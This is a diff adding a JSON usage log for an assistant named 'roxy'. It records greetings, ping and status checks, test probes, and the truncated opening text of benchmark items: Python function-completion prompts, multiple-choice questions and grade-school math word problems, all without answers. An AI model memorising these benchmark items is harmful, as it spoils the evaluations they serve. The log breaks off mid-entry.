@@ -1,0 +1,2622 @@
+[
+  {
+    "timestamp": "2026-01-04T01:12:43.473982",
+    "query": "hi roxy",
+    "response_length": 67,
+    "response_time": 0.007,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:12:43.564976",
+    "query": "hi roxy",
+    "response_length": 67,
+    "response_time": 0.0,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:12:43.570767",
+    "query": "hi roxy",
+    "response_length": 67,
+    "response_time": 0.0,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:12:43.577177",
+    "query": "hi roxy",
+    "response_length": 67,
+    "response_time": 0.0,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:12:43.582890",
+    "query": "hi roxy",
+    "response_length": 67,
+    "response_time": 0.0,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:12:43.588660",
+    "query": "hi roxy",
+    "response_length": 67,
+    "response_time": 0.0,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:12:43.594714",
+    "query": "hi roxy",
+    "response_length": 67,
+    "response_time": 0.0,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:12:43.600205",
+    "query": "hi roxy",
+    "response_length": 67,
+    "response_time": 0.0,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:12:43.605529",
+    "query": "hi roxy",
+    "response_length": 67,
+    "response_time": 0.0,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:12:43.611377",
+    "query": "hi roxy",
+    "response_length": 67,
+    "response_time": 0.0,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:12:43.616778",
+    "query": "hi roxy",
+    "response_length": 67,
+    "response_time": 0.0,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:12:52.096003",
+    "query": "what is roxy",
+    "response_length": 275,
+    "response_time": 8.47,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:12:54.431480",
+    "query": "what is roxy",
+    "response_length": 473,
+    "response_time": 2.329,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:12:56.293086",
+    "query": "what is roxy",
+    "response_length": 298,
+    "response_time": 1.855,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:12:58.663377",
+    "query": "what is roxy",
+    "response_length": 438,
+    "response_time": 2.363,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:13:00.526784",
+    "query": "what is roxy",
+    "response_length": 296,
+    "response_time": 1.857,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:13:03.379508",
+    "query": "status",
+    "response_length": 644,
+    "response_time": 2.841,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:13:05.721385",
+    "query": "status",
+    "response_length": 419,
+    "response_time": 2.341,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:13:08.065245",
+    "query": "status",
+    "response_length": 413,
+    "response_time": 2.343,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:13:10.944588",
+    "query": "status",
+    "response_length": 569,
+    "response_time": 2.878,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:13:13.251204",
+    "query": "status",
+    "response_length": 416,
+    "response_time": 2.305,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:13:16.106450",
+    "query": "ping",
+    "response_length": 407,
+    "response_time": 2.842,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:13:18.499570",
+    "query": "ping",
+    "response_length": 506,
+    "response_time": 2.386,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:13:21.358689",
+    "query": "ping",
+    "response_length": 666,
+    "response_time": 2.852,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:13:23.744570",
+    "query": "ping",
+    "response_length": 532,
+    "response_time": 2.378,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:13:26.111958",
+    "query": "ping",
+    "response_length": 497,
+    "response_time": 2.36,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:13:28.945165",
+    "query": "ping",
+    "response_length": 520,
+    "response_time": 2.826,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:13:31.301976",
+    "query": "ping",
+    "response_length": 508,
+    "response_time": 2.35,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:13:33.125990",
+    "query": "ping",
+    "response_length": 216,
+    "response_time": 1.817,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:13:35.484226",
+    "query": "ping",
+    "response_length": 503,
+    "response_time": 2.351,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:13:38.338682",
+    "query": "ping",
+    "response_length": 699,
+    "response_time": 2.847,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:13:41.203338",
+    "query": "ping",
+    "response_length": 579,
+    "response_time": 2.857,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:13:43.532780",
+    "query": "ping",
+    "response_length": 474,
+    "response_time": 2.322,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:13:46.970800",
+    "query": "ping",
+    "response_length": 772,
+    "response_time": 3.43,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:13:49.846092",
+    "query": "ping",
+    "response_length": 699,
+    "response_time": 2.868,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:13:52.241338",
+    "query": "ping",
+    "response_length": 532,
+    "response_time": 2.388,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:13:54.625073",
+    "query": "ping",
+    "response_length": 465,
+    "response_time": 2.376,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:13:58.987702",
+    "query": "ping",
+    "response_length": 1263,
+    "response_time": 4.355,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:14:01.344524",
+    "query": "ping",
+    "response_length": 392,
+    "response_time": 2.349,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:14:04.210181",
+    "query": "ping",
+    "response_length": 602,
+    "response_time": 2.858,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:14:07.555340",
+    "query": "ping",
+    "response_length": 896,
+    "response_time": 3.338,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:18:18.402226",
+    "query": "what model are you using",
+    "response_length": 180,
+    "response_time": 0.092,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:18:18.491803",
+    "query": "what model are you using",
+    "response_length": 180,
+    "response_time": 0.086,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:18:30.411684",
+    "query": "how's the repo looking today?",
+    "response_length": 1555,
+    "response_time": 11.919,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:18:33.797017",
+    "query": "what is roxy",
+    "response_length": 280,
+    "response_time": 3.382,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:18:33.890171",
+    "query": "what model are you using",
+    "response_length": 180,
+    "response_time": 0.09,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:18:48.218531",
+    "query": "what model are you using",
+    "response_length": 180,
+    "response_time": 0.821,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:32:34.398870",
+    "query": "hey roxy",
+    "response_length": 67,
+    "response_time": 0.0,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:36:19.063953",
+    "query": "Complete this Python function. Return ONLY the function body, no explanation.\n\nfrom typing import List\n\ndef has_close_elements(numbers: List[float], threshold: float) -> bool:\n    \"\"\" Check if in give",
+    "response_length": 1528,
+    "response_time": 9.929,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:36:23.486533",
+    "query": "Complete this Python function. Return ONLY the function body, no explanation.\n\nfrom typing import List\n\ndef separate_paren_groups(paren_string: str) -> List[str]:\n    \"\"\" Input to this function is a s",
+    "response_length": 2087,
+    "response_time": 4.419,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:36:26.388849",
+    "query": "Complete this Python function. Return ONLY the function body, no explanation.\n\ndef truncate_number(number: float) -> float:\n    \"\"\" Given a positive floating point number, it can be decomposed into\n  ",
+    "response_length": 1249,
+    "response_time": 2.899,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:36:30.285086",
+    "query": "Complete this Python function. Return ONLY the function body, no explanation.\n\nfrom typing import List\n\ndef mean_absolute_deviation(numbers: List[float]) -> float:\n    \"\"\" For a given list of input nu",
+    "response_length": 1972,
+    "response_time": 3.893,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:36:33.681991",
+    "query": "Complete this Python function. Return ONLY the function body, no explanation.\n\nfrom typing import List\n\ndef intersperse(numbers: List[int], delimeter: int) -> List[int]:\n    \"\"\" Insert a number 'delim",
+    "response_length": 1343,
+    "response_time": 3.393,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:36:39.084579",
+    "query": "Complete this Python function. Return ONLY the function body, no explanation.\n\nfrom typing import List\n\ndef parse_nested_parens(paren_string: str) -> List[int]:\n    \"\"\" Input to this function is a str",
+    "response_length": 2392,
+    "response_time": 5.399,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:36:41.488039",
+    "query": "Complete this Python function. Return ONLY the function body, no explanation.\n\nfrom typing import List\n\ndef filter_by_substring(strings: List[str], substring: str) -> List[str]:\n    \"\"\" Filter an inpu",
+    "response_length": 1031,
+    "response_time": 2.4,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:36:45.378714",
+    "query": "Complete this Python function. Return ONLY the function body, no explanation.\n\nfrom typing import List, Tuple\n\ndef sum_product(numbers: List[int]) -> Tuple[int, int]:\n    \"\"\" For a given list of integ",
+    "response_length": 1616,
+    "response_time": 3.888,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:36:49.285922",
+    "query": "Complete this Python function. Return ONLY the function body, no explanation.\n\ndef is_palindrome(string: str) -> bool:\n    \"\"\" Test if given string is a palindrome \"\"\"\n    return string == string[::-1",
+    "response_length": 1992,
+    "response_time": 3.904,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:36:52.240183",
+    "query": "Complete this Python function. Return ONLY the function body, no explanation.\n\nfrom typing import List\n\ndef string_xor(a: str, b: str) -> str:\n    \"\"\" Input are two strings a and b consisting only of ",
+    "response_length": 1212,
+    "response_time": 2.951,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:36:57.221919",
+    "query": "Answer this multiple choice question. Respond with ONLY the letter (A, B, C, or D).\n\nQuestion: Find the degree for the given field extension Q(sqrt(2), sqrt(3), sqrt(18)) over Q.\nA) 0\nB) 4\nC) 2\nD) 6\n\n",
+    "response_length": 889,
+    "response_time": 4.978,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:37:00.112360",
+    "query": "Answer this multiple choice question. Respond with ONLY the letter (A, B, C, or D).\n\nQuestion: Find all zeros in the indicated finite field of the given polynomial with coefficients in that field. x^5",
+    "response_length": 1050,
+    "response_time": 2.887,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:37:03.023962",
+    "query": "Answer this multiple choice question. Respond with ONLY the letter (A, B, C, or D).\n\nQuestion: Which of the following is the body cavity that contains the pituitary gland?\nA) Abdominal cavity\nB) Crani",
+    "response_length": 942,
+    "response_time": 2.908,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:37:05.903064",
+    "query": "Answer this multiple choice question. Respond with ONLY the letter (A, B, C, or D).\n\nQuestion: The longest muscle in the human body is:\nA) Sartorius\nB) Rectus femoris\nC) Biceps femoris\nD) Gluteus maxi",
+    "response_length": 966,
+    "response_time": 2.876,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:37:07.922877",
+    "query": "Answer this multiple choice question. Respond with ONLY the letter (A, B, C, or D).\n\nQuestion: Which of the following is an approximation to the number of operations a typical computer can perform in ",
+    "response_length": 660,
+    "response_time": 2.017,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:37:10.283635",
+    "query": "Answer this multiple choice question. Respond with ONLY the letter (A, B, C, or D).\n\nQuestion: A certain pipelined RISC machine has 8 general-purpose registers R0, R1, . . . , R7 and supports the foll",
+    "response_length": 1209,
+    "response_time": 2.358,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:37:12.239492",
+    "query": "Answer this multiple choice question. Respond with ONLY the letter (A, B, C, or D).\n\nQuestion: The longest-lasting empire in history was:\nA) Roman Empire\nB) Byzantine Empire\nC) Ottoman Empire\nD) Briti",
+    "response_length": 602,
+    "response_time": 1.953,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:37:15.188330",
+    "query": "Answer this multiple choice question. Respond with ONLY the letter (A, B, C, or D).\n\nQuestion: The printing press was invented in approximately:\nA) 1250\nB) 1350\nC) 1450\nD) 1550\n\nAnswer:",
+    "response_length": 831,
+    "response_time": 2.946,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:37:18.080070",
+    "query": "Answer this multiple choice question. Respond with ONLY the letter (A, B, C, or D).\n\nQuestion: The speed of light in a vacuum is approximately:\nA) 3 x 10^6 m/s\nB) 3 x 10^8 m/s\nC) 3 x 10^10 m/s\nD) 3 x ",
+    "response_length": 664,
+    "response_time": 2.888,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:37:21.494352",
+    "query": "Answer this multiple choice question. Respond with ONLY the letter (A, B, C, or D).\n\nQuestion: If a 3 kg object is moving at 4 m/s, what is its kinetic energy?\nA) 6 J\nB) 12 J\nC) 24 J\nD) 48 J\n\nAnswer:",
+    "response_length": 891,
+    "response_time": 3.411,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:37:23.922195",
+    "query": "Answer this multiple choice question. Respond with ONLY the letter (A, B, C, or D).\n\nQuestion: Select the best answer: All A are B. All B are C. Therefore:\nA) All C are A\nB) Some C are A\nC) All A are ",
+    "response_length": 674,
+    "response_time": 2.425,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:37:25.819703",
+    "query": "Answer this multiple choice question. Respond with ONLY the letter (A, B, C, or D).\n\nQuestion: Which of the following is a tautology?\nA) P \u2228 \u00acP\nB) P \u2227 \u00acP\nC) P \u2192 Q\nD) P \u2194 Q\n\nAnswer:",
+    "response_length": 493,
+    "response_time": 1.894,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:37:31.688595",
+    "query": "Solve this math problem step by step. At the end, write your final numerical answer after \"#### \".\n\nProblem: Janet's ducks lay 16 eggs per day. She eats three for breakfast every morning and bakes muf",
+    "response_length": 2239,
+    "response_time": 5.866,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:37:37.066123",
+    "query": "Solve this math problem step by step. At the end, write your final numerical answer after \"#### \".\n\nProblem: A robe takes 2 bolts of blue fiber and half that much white fiber. How many bolts in total ",
+    "response_length": 1617,
+    "response_time": 5.374,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:37:42.441876",
+    "query": "Solve this math problem step by step. At the end, write your final numerical answer after \"#### \".\n\nProblem: Josh decides to try flipping a house. He buys a house for $80,000 and then puts in $50,000 ",
+    "response_length": 1781,
+    "response_time": 5.373,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:37:46.834154",
+    "query": "Solve this math problem step by step. At the end, write your final numerical answer after \"#### \".\n\nProblem: James decides to run 3 sprints 3 times a week. He runs 60 meters each sprint. How many tota",
+    "response_length": 1281,
+    "response_time": 4.389,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:37:52.242939",
+    "query": "Solve this math problem step by step. At the end, write your final numerical answer after \"#### \".\n\nProblem: Every day, Wendi feeds each of her chickens three cups of mixed chicken feed, containing se",
+    "response_length": 2319,
+    "response_time": 5.406,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:37:58.161206",
+    "query": "Solve this math problem step by step. At the end, write your final numerical answer after \"#### \".\n\nProblem: Kylar went to the store to buy glasses for his new apartment. One glass costs $5, but every",
+    "response_length": 1838,
+    "response_time": 5.915,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:38:04.045743",
+    "query": "Solve this math problem step by step. At the end, write your final numerical answer after \"#### \".\n\nProblem: Marissa is hiking a 12-mile trail. She took 1 hour to walk the first 4 miles, then another ",
+    "response_length": 1998,
+    "response_time": 5.881,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:38:09.997134",
+    "query": "Solve this math problem step by step. At the end, write your final numerical answer after \"#### \".\n\nProblem: I have 10 liters of orange drink that are two-thirds water and I wish to add it to 15 liter",
+    "response_length": 2037,
+    "response_time": 5.948,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:38:15.865769",
+    "query": "Solve this math problem step by step. At the end, write your final numerical answer after \"#### \".\n\nProblem: Raymond and Samantha are cousins. Raymond was born 6 years before Samantha. Raymond had a s",
+    "response_length": 1884,
+    "response_time": 5.866,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T01:38:21.721211",
+    "query": "Solve this math problem step by step. At the end, write your final numerical answer after \"#### \".\n\nProblem: Billy sells DVDs. He has 8 customers on Tuesday. His first 3 customers buy one DVD each. Hi",
+    "response_length": 1988,
+    "response_time": 5.852,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T02:03:13.741559",
+    "query": "Enter",
+    "response_length": 1150,
+    "response_time": 4.925,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T02:47:14.899248",
+    "query": "Q: Speed of light in vacuum? A) 3x10^6 m/s B) 3x10^8 m/s C) 3x10^10 m/s D) 3x10^12 m/s - just answer with the letter",
+    "response_length": 801,
+    "response_time": 4.176,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T02:50:33.510575",
+    "query": "What is the speed of light?",
+    "response_length": 511,
+    "response_time": 5.528,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T02:53:53.936894",
+    "query": "what is quantum rails in mindsong - one sentence",
+    "response_length": 696,
+    "response_time": 3.485,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T03:09:36.050166",
+    "query": "hey roxy!! whats up? feeling any better?",
+    "response_length": 67,
+    "response_time": 0.0,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T03:12:07.003047",
+    "query": "how many onboarding files does mindsong have?",
+    "response_length": 1484,
+    "response_time": 0.078,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:03:55.138943",
+    "query": "What is 2+2? Be brief.",
+    "response_length": 525,
+    "response_time": 8.576,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:23:36.022163",
+    "query": "hello roxy",
+    "response_length": 67,
+    "response_time": 0.0,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:23:36.493509",
+    "query": "git status",
+    "response_length": 166,
+    "response_time": 0.468,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:23:36.499134",
+    "query": "hello",
+    "response_length": 67,
+    "response_time": 0.0,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:23:46.947942",
+    "query": "test 0",
+    "response_length": 657,
+    "response_time": 10.445,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:23:50.416928",
+    "query": "test 0",
+    "response_length": 691,
+    "response_time": 3.463,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:23:55.367060",
+    "query": "test after wait",
+    "response_length": 1125,
+    "response_time": 4.946,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:23:58.780477",
+    "query": "invalid_command_xyz_123",
+    "response_length": 622,
+    "response_time": 3.41,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:24:02.243687",
+    "query": "test 0",
+    "response_length": 696,
+    "response_time": 3.453,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:24:05.626948",
+    "query": "test 1",
+    "response_length": 525,
+    "response_time": 3.381,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:24:08.560981",
+    "query": "test 2",
+    "response_length": 415,
+    "response_time": 2.93,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:24:11.594451",
+    "query": "test 3",
+    "response_length": 405,
+    "response_time": 3.029,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:24:15.049655",
+    "query": "test 4",
+    "response_length": 642,
+    "response_time": 3.451,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:24:15.061383",
+    "query": "hello",
+    "response_length": 67,
+    "response_time": 0.0,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:24:15.080196",
+    "query": "hello roxy",
+    "response_length": 67,
+    "response_time": 0.0,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:24:19.023262",
+    "query": "test 0",
+    "response_length": 718,
+    "response_time": 3.938,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:24:24.616474",
+    "query": "test 1",
+    "response_length": 453,
+    "response_time": 5.589,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": true,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:24:28.073254",
+    "query": "test 2",
+    "response_length": 686,
+    "response_time": 3.453,
+    "accuracy_score": null,
+    "truthfulness_score": null,
+    "has_source": false,
+    "cache_hit": false
+  },
+  {
+    "timestamp": "2026-01-04T04:24:31.546664",
+    "query": "test 3",
+    "response_length": 566,
